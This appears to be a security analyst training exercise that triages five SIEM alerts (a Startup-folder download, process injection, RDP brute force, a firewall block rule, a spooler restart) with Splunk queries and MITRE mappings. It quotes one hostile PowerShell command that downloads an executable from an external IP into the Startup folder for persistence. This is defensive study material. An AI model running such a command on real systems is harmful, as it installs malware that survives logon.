# Investigation — Case 016 (Phase 3: 5-Alert Queue, Mixed Format)

## Prioritization Decision (Before Investigation)

**Chosen order: Z → Y → AA → X → AB**

**Justification:**
- **Alert Z first** — combines active malware delivery (download from raw external IP) with immediate persistence (Startup folder placement); the highest-impact, actively-executing combination in the queue.
- **Alert Y second** — confirmed process injection is a live, in-progress technique; checked immediately after Z since both represent active malicious execution rather than historical events.
- **Alert AA third** — a completed/ongoing external brute-force attempt; serious but represents an external attack surface issue rather than confirmed local compromise, appropriately placed after the two active-execution alerts.
- **Alert X fourth** — a firewall rule referencing "malicious C2" could represent either an attack or a defensive response; checked before the lowest-priority item without assuming malicious intent from the name alone.
- **Alert AB last** — a print service restart is a common, largely mundane administrative event; correctly triaged last.

---

## Alert Z — PowerShell Download to Startup Folder

**SPL Query:**
```spl
index=* sourcetype="WinEventLog:Security" EventCode=4688 New_Process_Name="*powershell.exe" Process_Command_Line="*Startup*"
| table _time, ComputerName, Account_Name, Process_Command_Line, Creator_Process_Name
| sort -_time
| head 5
```

**Result:** `Invoke-WebRequest -Uri http://185.220.101.45/update.exe -OutFile 'C:\Users\hp\AppData\Roaming\...\Startup\update.exe'`, parent `cmd.exe`.

**Findings:**
- 🔴 Raw external IP with no legitimate business justification, downloading an executable file directly.
- 🔴 Destination is the Startup folder — a confirmed persistence location (any file placed here executes automatically at every user logon), functionally equivalent to Case_007's registry Run key persistence mechanism.

**Verdict: 🔴 TP — T1105 (Ingress Tool Transfer), T1547.001 (Registry Run Keys / Startup Folder)**

---

## Alert Y — Process Injection (EDR-Style Alert)

**Given Data (EDR-format, no Splunk equivalent — different tool format than Windows Event Log):**
```
Detection Name: Suspicious Process Injection
Process: powershell.exe (PID 4821)
Injected Into: explorer.exe (PID 2104)
MITRE: T1055
```

**Findings:**
- 🔴 `explorer.exe` is a legitimate, always-running system process — code injection into trusted processes like this is a well-documented technique used to blend malicious activity with legitimate process behavior and evade tools that whitelist known Windows processes.
- 🟢 Unlike prior technique-vs-outcome Ambiguous cases (Case_003, Case_011 Alert H, Case_014 Alert P), this alert reflects a **confirmed detection of the injection itself occurring**, not merely an attempted or available technique. There is no benign specific-outcome to weigh against it — the action is the evidence.

**Verdict: 🔴 TP — T1055 (Process Injection)**

---

## Alert AA — Multiple RDP Logon Failures from External IP

**Given Data (external attack simulation, not safely reproducible live):**
```
15 failed RDP logon attempts from external IP 103.75.201.44 targeting account "administrator" within 2 minutes
```

**Findings:**
- 🔴 High volume (15 attempts), tight time window (2 minutes), single high-value target account (`administrator`), and **external** source IP — distinct from Case_005 (internal, single account) and Case_006 (internal, multiple accounts) in that this demonstrates active external attack surface exposure via RDP, a commonly targeted remote access protocol.

**Verdict: 🔴 TP — T1110 (Brute Force), relevant to T1021.001 (Remote Desktop Protocol) as the targeted service**

---

## Alert X — New Firewall Rule (Blocking Outbound to Named "Malicious" IP)

**SPL Query:**
```spl
index=* sourcetype="WinEventLog:Security" EventCode=4688 New_Process_Name="*netsh.exe"
| table _time, ComputerName, Account_Name, Process_Command_Line, Creator_Process_Name
| sort -_time
| head 5
```

**Result:** `netsh advfirewall firewall add rule name="Block_Malicious_C2" dir=out action=block remoteip=91.243.85.22`, parent `cmd.exe`.

**Findings:**
- 🟢 **Direction is the decisive factor.** This rule uses `action=block` on `dir=out` — actively preventing outbound communication to an IP explicitly identified as malicious in the rule's own name. This is the inverse of Case_012's Alert R, which used `action=allow` on `dir=in` to open inbound access on a suspicious port (Metasploit default). Blocking a known-bad destination is defensive/protective behavior, not an attack indicator — firewall rule verdicts must always account for direction and action type, not just the presence of a suspicious-sounding reference in the rule.

**Verdict: 🟢 FP**

---

## Alert AB — Print Spooler Service Restarted

**Given Data:**
```
Service: Print Spooler (Spooler) restarted | Account: SYSTEM | Time: 10:30 AM
```

**Findings:**
- 🟢 The Print Spooler service is well-documented as prone to crashing/hanging in normal Windows operation; both automatic recovery configurations and routine manual IT restarts are common. No masquerading name, no unusual account context (SYSTEM is expected for spooler service actions), no unusual timing (business hours), and no chained suspicious activity present.

**Verdict: 🟢 FP**

---

## Summary Table

| Alert | Verdict | MITRE | SIEM Label vs. Reality |
|---|---|---|---|
| Z — Startup Download | 🔴 TP | T1105, T1547.001 | High label matched reality |
| Y — Process Injection | 🔴 TP | T1055 | High label matched reality |
| AA — RDP Brute Force | 🔴 TP | T1110 | Medium label underestimated severity given external origin and high-value target |
| X — Firewall Block Rule | 🟢 FP | — | Info label matched reality |
| AB — Print Spooler Restart | 🟢 FP | — | Info label matched reality |
